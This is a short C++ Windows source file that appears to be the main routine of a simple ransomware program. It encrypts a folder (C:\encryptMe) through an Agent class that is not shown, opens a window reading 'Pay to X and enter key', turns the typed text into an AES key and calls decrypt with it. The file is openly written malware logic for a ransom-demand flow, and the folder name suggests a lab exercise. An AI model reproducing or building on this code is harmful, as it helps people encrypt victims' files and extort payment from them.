#include "Agent.h"
#include "TextBoxInput.h"

#include <Windows.h>
#include <chrono>


using namespace std::literals;

int WINAPI WinMain(HINSTANCE hInstance,
				   HINSTANCE hPrevInstance,
				   LPSTR     lpCmdLine,
				   int       nShowCmd)
{
	Agent agent("C:\\encryptMe");
	agent.execute();

	TextBoxInput text_box_input(hInstance, L"window payme", L"Pay to X and enter key");
	text_box_input.window_loop();
	const std::wstring key_as_string = text_box_input.text_input();

	std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH> encryption_key;
	uint32_t current_key_byte = 0;
	for (char key_byte : key_as_string)
	{
		if (current_key_byte >= CryptoPP::AES::DEFAULT_KEYLENGTH)
		{
			break;
		}

		encryption_key[current_key_byte++] = static_cast<CryptoPP::byte>(key_byte);
	}

	agent.decrypt(encryption_key);
	
	return 0;
}
